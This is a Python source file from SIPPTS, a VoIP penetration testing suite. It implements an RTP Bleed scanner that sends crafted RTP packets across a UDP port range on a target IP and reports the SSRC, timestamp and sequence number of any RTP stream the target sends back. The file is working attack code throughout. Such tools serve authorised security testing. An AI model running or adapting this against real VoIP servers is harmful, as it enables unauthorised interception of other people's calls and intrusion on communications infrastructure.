#!/usr/bin/env python3
# -*- coding: utf-8 -*-

__author__ = 'Jose Luis Verdeguer'
__version__ = '3.0.0'
__license__ = "GPL"
__copyright__ = "Copyright (C) 2015-2022, SIPPTS"
__email__ = "pepeluxx@gmail.com"

# based in rtpnatscan: https://github.com/kapejod/rtpnatscan

import socket
import fcntl
import os
import sys
import time

BRED = '\033[1;31;40m'
RED = '\033[0;31;40m'
BRED_BLACK = '\033[1;30;41m'
RED_BLACK = '\033[0;30;41m'
BGREEN = '\033[1;32;40m'
GREEN = '\033[0;32;40m'
BGREEN_BLACK = '\033[1;30;42m'
GREEN_BLACK = '\033[0;30;42m'
BYELLOW = '\033[1;33;40m'
YELLOW = '\033[0;33;40m'
BBLUE = '\033[1;34;40m'
BLUE = '\033[0;34;40m'
BMAGENTA = '\033[1;35;40m'
MAGENTA = '\033[0;35;40m'
BCYAN = '\033[1;36;40m'
CYAN = '\033[0;36;40m'
BWHITE = '\033[1;37;40m'
WHITE = '\033[0;37;40m'


class RTPBleed:
    def __init__(self):
        self.ip = ''
        self.start_port = '10000'
        self.end_port = '20000'
        self.loops = '4'
        self.payload = '0'
        self.delay = '50'

    def start(self):
        self.start_port = int(self.start_port)
        self.end_port = int(self.end_port)
        self.loops = int(self.loops)
        self.payload = int(self.payload)
        self.delay = int(self.delay)

        print(BWHITE + '[!] Target IP: ' + YELLOW + '%s' % self.ip)
        print(BWHITE + '[!] Port range:' + YELLOW + ' %d' %
              self.start_port + WHITE + '-' + YELLOW + '%d' % self.end_port)
        print(BWHITE + '[!] Payload type: ' + YELLOW + '%d' % self.payload)
        print(BWHITE + '[!] Number of tries per port: ' +
              YELLOW + '%d' % self.loops)
        print(BWHITE + '[!] Delay between tries: ' +
              YELLOW + '%d microseconds' % self.delay)
        print(WHITE)

        # Create a UDP socket
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        except socket.error:
            print(RED + 'Failed to create socket' + WHITE)
            sys.exit(1)
        fcntl.fcntl(sock, fcntl.F_SETFL, os.O_NONBLOCK)

        port = self.start_port

        while port < self.end_port+2:
            try:
                host = (str(self.ip), port)

                loop = 0

                while loop < self.loops:
                    cloop = str(loop).zfill(4)
                    cpayload = '%s' % hex(0x80 | self.payload & 0x7F)[2:]
                    # byte[0] = 0x80 => RTP version 2
                    # byte[1] = 0x80+payload => Codec version
                    # byte[2-3] = Sequence nunber
                    message = ('80'+cpayload+cloop+'0000000000000000')
                    byte_array = bytearray.fromhex(message)

                    print(YELLOW + '[+] Checking port: %d with payload type %d (Seq number: %d)  ' %
                          (port, self.payload, loop+1), end="\r")

                    # Send data
                    sock.sendto(byte_array, host)
                    time.sleep((self.delay+loop)/1000.0)

                    loop += 1

                    try:
                        (msg, addr) = sock.recvfrom(4096)
                        (ipaddr, rport) = addr
                        size = len(msg)

                        if size >= 12:
                            # print(msg)
                            x = '%s%s' % (hex(msg[2])[2:], hex(msg[3])[2:])
                            seq = int('0x%s' % x, base=16)
                            x = '%s%s%s%s' % (hex(msg[4])[2:], hex(msg[5])[
                                              2:], hex(msg[6])[2:], hex(msg[7])[2:])
                            timestamp = int('0x%s' % x, base=16)
                            ssrc = '%s%s%s%s' % (hex(msg[8])[2:], hex(
                                msg[9])[2:], hex(msg[10])[2:], hex(msg[11])[2:])

                            print(YELLOW + '\n[+] received %d bytes from target port %d - loop %d' %
                                  (size, rport, loop))
                            print(WHITE + '    [-] SSRC: %s - Timestamp: %s - Seq number: %s' %
                                  (ssrc, timestamp, seq))
                    except:
                        # No data available
                        continue
            except KeyboardInterrupt:
                print(YELLOW + '\nYou pressed Ctrl+C!')
                exit()
            except:
                pass

            port += 2

        print(WHITE)
